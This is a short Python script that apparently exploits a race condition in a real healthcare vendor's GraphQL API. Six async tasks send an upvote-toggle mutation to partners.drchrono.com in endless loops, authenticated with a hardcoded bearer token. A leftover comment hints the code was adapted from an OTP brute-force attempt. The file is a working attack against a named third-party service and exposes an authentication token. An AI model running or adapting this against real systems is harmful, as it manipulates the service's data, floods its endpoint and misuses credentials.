import requests
import threading
import time
import aiohttp
import asyncio
import json



async def race(header):
	async with aiohttp.ClientSession() as session:
		while True:
			async with session.post('https://partners.drchrono.com/graphql/',headers=header,json ={"operationName":"ToggleRequestedProductUpvote","variables":{"uuid":"Ki2qZMk"},"query":"fragment Error on ErrorNode {\n  field\n  error\n  __typename\n}\n\nmutation ToggleRequestedProductUpvote($uuid: String!) {\n  toggleRequestedProductUpvote(uuid: $uuid) {\n    errors {\n      ...Error\n      __typename\n    }\n    requestedProduct {\n      uuid\n      upvotes\n      __typename\n    }\n    currentUser {\n      uuid\n      upvotedRequestedProducts {\n        uuid\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"} ) as resp:
				print(resp.status)
				#if "successfully logged In" in (await resp.text()):
				#	print(otp)






async def main(header):
	try:
		a = asyncio.create_task(race(header))
		b = asyncio.create_task(race(header))
		c = asyncio.create_task(race(header))
		e = asyncio.create_task(race(header))
		f = asyncio.create_task(race(header))
		g = asyncio.create_task(race(header))
		try:
			result1 = await a
		except BaseException  as eee:
			print(eee)
		try:
			result2 = await b
		except BaseException  as eee:
			print(eee)
		try:
			result3 = await c
		except BaseException  as eee:
			print(eee)
		try:
			result4 = await e
		except BaseException  as eee:
			print(eee)
		try:
			result5 = await f
		except BaseException  as eee:
			print(eee)
		try:
			result6 = await g
		except BaseException  as eee:
			print(eee)
	except Exception as ee:
		print(ee)

start_time = time.time()
#asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
header = {"Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MzY3ODU1MDAsInVzZXJfaWQiOjEzMTcsImlzX2FjdGl2ZSI6dHJ1ZSwiaXNfaW1wZXJzb25hdG9yIjpmYWxzZSwiaXNfc29jaWFsX3VzZXIiOmZhbHNlLCJwcm92aWRlciI6bnVsbCwiYXV0aGVudGljYXRlZCI6dHJ1ZX0.tiwIKtomyOyIdTM-GJr7AJZVTW2hi3kPtoBMKo6UU5A"}
resss = asyncio.run(main(header))
